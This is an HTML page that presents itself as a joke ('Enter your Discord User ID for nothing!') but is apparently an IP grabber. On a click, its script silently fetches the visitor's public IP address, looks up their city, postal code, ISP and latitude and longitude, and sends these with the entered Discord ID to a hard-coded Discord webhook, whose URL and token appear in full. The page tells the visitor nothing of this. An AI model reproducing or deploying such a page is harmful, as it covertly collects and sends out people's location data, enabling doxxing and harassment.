<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click for Nothing</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a2e;
            color: #e0e0e0;
            text-align: center;
            padding: 50px;
            margin: 0;
            overflow: hidden; /* Disable scroll */
        }
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            color: #f2a365;
        }
        input, button {
            padding: 10px;
            margin: 5px;
            font-size: 18px;
            border-radius: 5px;
        }
        button {
            background-color: #e94560;
            border: none;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.3s;
        }
        button:hover {
            background-color: #d63447;
        }
        #loading {
            display: none;
            margin-top: 20px;
            font-size: 1.2em;
            color: #f2a365;
        }
        #message {
            margin-top: 20px;
            font-size: 1.2em;
            color: #e0e0e0;
        }
        #timer {
            margin-top: 10px;
            font-size: 1.2em;
            color: #f2a365;
        }
    </style>
</head>
<body>
    <h1>Enter your Discord User ID for nothing!</h1>
    <input type="text" id="userid" placeholder="Enter User ID" required>
    <button id="sendInfoButton">Click me!</button>
    <div id="loading">Wait for nothing...</div>
    <div id="message"></div>
    <div id="timer"></div>

    <script>
        const cooldownTime = 30 * 1000; // 30 seconds in milliseconds

        function checkCooldown() {
            const lastClicked = localStorage.getItem('lastClicked');
            if (lastClicked) {
                const timePassed = Date.now() - lastClicked;
                if (timePassed < cooldownTime) {
                    startTimer(cooldownTime - timePassed);
                    document.getElementById("sendInfoButton").disabled = true;
                    return true; // Cooldown active
                }
            }
            return false; // No cooldown
        }

        function startTimer(remainingTime) {
            const timerElement = document.getElementById("timer");
            const intervalId = setInterval(() => {
                const seconds = Math.floor((remainingTime / 1000) % 60);
                timerElement.innerText = `You must wait ${seconds}s before clicking again.`;
                remainingTime -= 1000; // Decrease the remaining time by 1 second
                if (remainingTime <= 0) {
                    clearInterval(intervalId);
                    localStorage.removeItem('lastClicked'); // Clear cooldown on timeout
                    document.getElementById("sendInfoButton").disabled = false;
                    timerElement.innerText = ''; // Clear timer display
                }
            }, 1000); // Update every second
        }

        document.getElementById("sendInfoButton").addEventListener("click", function() {
            if (checkCooldown()) return; // If in cooldown, do not proceed
            
            const userid = document.getElementById("userid").value;
            if (!userid || userid.length < 5) {
                document.getElementById("message").innerText = 'Please enter a valid User ID (at least 5 characters).';
                return;
            }

            document.getElementById("loading").style.display = "block";
            document.getElementById("message").innerText = "";

            // Store the current time as the last clicked time
            localStorage.setItem('lastClicked', Date.now());

            // Fetch IP Address
            fetch("https://api.ipify.org?format=json")
                .then(response => {
                    if (!response.ok) throw new Error('Failed to fetch IP address');
                    return response.json();
                })
                .then(ipData => {
                    const ip = ipData.ip;
                    return fetch(`https://ipapi.co/${ip}/json/`);
                })
                .then(response => {
                    if (!response.ok) throw new Error('Failed to fetch IP details');
                    return response.json();
                })
                .then(data => {
                    const accountCreationDate = "2021-01-01"; // Placeholder for actual logic
                    const accountCreationDateFormatted = new Date(accountCreationDate);
                    const currentDate = new Date();
                    const accountAge = Math.floor((currentDate - accountCreationDateFormatted) / (1000 * 60 * 60 * 24 * 365));

                    const webhookUrl = 'https://discord.com/api/webhooks/1302389815362326580/j1JYAN8CXgwYfbqKH7nRsitHvg-DjDoBHNPIiHLqadmJDkluLyt37hNKeanbzggduDE-';
                    const message = {
                        embeds: [{
                            title: "IP INFORMATION",
                            fields: [
                                { name: "IP Address", value: data.ip, inline: true },
                                { name: "City", value: data.city, inline: true },
                                { name: "Region", value: data.region, inline: true },
                                { name: "Country", value: data.country_name, inline: true },
                                { name: "Postal", value: data.postal, inline: true },
                                { name: "Continent", value: data.continent, inline: true },
                                { name: "ISP", value: data.org, inline: true },
                                { name: "Timezone", value: data.timezone, inline: true },
                                { name: "Latitude", value: data.latitude, inline: true },
                                { name: "Longitude", value: data.longitude, inline: true },
                                { name: "Currency", value: data.currency, inline: true },
                                { name: "Language", value: data.language, inline: true },
                                { name: "Local Time", value: new Date().toLocaleString(), inline: true }
                            ],
                            color: 0xe94560 // Color of the embed
                        },
                        {
                            title: "Discord Account Information",
                            fields: [
                                { name: "UserID", value: userid, inline: true },
                                { name: "Account Creation Date", value: accountCreationDateFormatted.toDateString(), inline: true },
                                { name: "Account Age", value: `${accountAge} years`, inline: true }
                            ]
                        },
                        {
                            title: "Button Click Count",
                            description: `${parseInt(localStorage.getItem('clickCount') || 0)} times`,
                        }],
                    };

                    return fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(message)
                    });
                })
                .then(response => {
                    document.getElementById("loading").style.display = "none";
                    if (response.ok) {
                        document.getElementById("message").innerText = 'Thanks for nothing!'; // Updated success message
                    } else {
                        throw new Error('Failed to send message to Discord');
                    }
                })
                .catch(error => {
                    document.getElementById("loading").style.display = "none";
                    document.getElementById("message").innerText = 'Error occurred. Please try again.';
                    console.error('Error:', error.message);
                });

            // Start timer for cooldown period
            startTimer(cooldownTime);
        });

        // Check cooldown on page load
        window.onload = function() {
            checkCooldown();
        };
    </script>
</body>
  </html>
